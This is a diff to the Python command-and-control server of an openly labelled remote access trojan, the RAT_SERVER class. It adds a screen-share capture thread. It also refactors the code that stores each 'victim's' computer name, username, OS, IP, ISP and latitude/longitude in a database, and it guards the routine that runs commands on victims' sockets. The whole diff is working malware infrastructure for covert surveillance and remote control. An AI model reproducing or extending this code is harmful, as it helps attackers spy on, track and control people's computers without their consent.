@@ -32,6 +32,13 @@ class RAT_SERVER(metaclass=SingletonMeta):
                 target=self.file_manager.start_download_server)
             self.file_download_thread.start()
 
+            self.screen_share_manager = ScreenShareManager(
+                "localhost", 8095)
+
+            self.screen_share_thread = threading.Thread(
+                target=self.screen_share_manager.connect)
+            self.screen_share_thread.start()
+
             # self.disconnection_thread = threading.Thread(
             #     target=self.check_client_disconnection)
             # self.disconnection_thread.daemon = True
@@ -46,6 +53,7 @@ class RAT_SERVER(metaclass=SingletonMeta):
         while True:
             try:
                 client, addr = server_socket.accept()
+                print("Clients ->", self.clients)
                 self.clients.append((client, addr))
                 print(f"[*] Connection established with {addr[0]}")
 
@@ -54,35 +62,29 @@ class RAT_SERVER(metaclass=SingletonMeta):
                 if output is None:
                     continue
 
-                print(
-                    f"[*] Adding {output['System Info']['ComputerName']} to the list of victims")
-
                 try:
                     if not get_client_by_socket_ip(addr[0]):
                         random_uuid = str(uuid.uuid4().hex)
                         directory = f"data/{output['System Info']['ComputerName']}/screenshare/{random_uuid}/"
 
                         output["SCREENSHARE_SOURCE"] = f"{directory}video.avi"
-                        add_client(output["System Info"]["IPv4"], "Online", output['System Info']['ComputerName'], output['System Info']["OS"], output['System Info']["Architecture"], output['System Info']["Username"], output['System Info']["Country"], output['System Info']["City"], output['System Info']["Location"]["Latitude"], output['System Info']["Location"]["Longitude"],
-                                   output['System Info']["ISP"], output['System Info']["Timezone"], output['System Info']["Organization"], output['System Info']["Postal"], output['System Info']["ConnectionType"], output['System Info']["Region"], output['System Info']["RegionName"], output["SCREENSHARE_SOURCE"], addr[0])
+                        self.add_client_to_db(output, addr)
                         print("Added client to database")
                 except Exception as e:
                     random_uuid = str(uuid.uuid4().hex)
                     directory = f"data/{output['System Info']['ComputerName']}/screenshare/{random_uuid}/"
 
                     output["SCREENSHARE_SOURCE"] = f"{directory}video.avi"
-                    add_client(output["System Info"]["IPv4"], "Online", output['System Info']['ComputerName'], output['System Info']["OS"], output['System Info']["Architecture"], output['System Info']["Username"], output['System Info']["Country"], output['System Info']["City"], output['System Info']["Location"]["Latitude"], output['System Info']["Location"]["Longitude"],
-                               output['System Info']["ISP"], output['System Info']["Timezone"], output['System Info']["Organization"], output['System Info']["Postal"], output['System Info']["ConnectionType"], output['System Info']["Region"], output['System Info']["RegionName"], output["SCREENSHARE_SOURCE"], addr[0])
+                    self.add_client_to_db(output, addr)
 
                     print(f"Error getting client by socket ip: {str(e)}")
 
                 edit_client(get_client_by_socket_ip(
                     addr[0])[0].id, "status", "Online")
-                self.file_manager.set_victim_list(
-                    get_client_by_socket_ip(addr[0]))
             except Exception as e:
                 print(f"Error building connection: {str(e)}")
                 for client in self.clients:
+                    print(client[1][0])
                     if client[1][0] == addr[0]:
                         self.clients.remove(client)
                         print(f"[*] Client {addr[0]} disconnected")
@@ -117,19 +119,18 @@ class RAT_SERVER(metaclass=SingletonMeta):
             print(f"Error receiving output: {str(e)}")
 
     def execute(self, command_type, command, socket_ip):
+        client_socket = None
         for client in self.clients:
             if client[1][0] == socket_ip:
                 client_socket = client[0]
                 break
 
+        if client_socket is None:
+            return "Error executing command"
         executeCommands(command_type, command, client_socket)
 
     async def transfer_file(self, victim, file: UploadFile):
         await self.file_manager.upload_file(victim, file)
-
-
-
-
 
     def check_client_disconnection(self):
         while True:
@@ -154,3 +155,7 @@ class RAT_SERVER(metaclass=SingletonMeta):
                     print(f"Error updating client status: {str(e)}")
 
             time.sleep(15)  # Check for disconnections every 5 seconds
+
+    def add_client_to_db(self, output, addr):
+        add_client(output["System Info"]["IPv4"], "Online", output['System Info']['ComputerName'], output['System Info']["OS"], output['System Info']["Architecture"], output['System Info']["Username"], output['System Info']["Country"], output['System Info']["City"], output['System Info']["Location"]["Latitude"], output['System Info']["Location"]["Longitude"],
+                   output['System Info']["ISP"], output['System Info']["Timezone"], output['System Info']["Organization"], output['System Info']["Postal"], output['System Info']["ConnectionType"], output['System Info']["Region"], output['System Info']["RegionName"], output["SCREENSHARE_SOURCE"], addr[0])
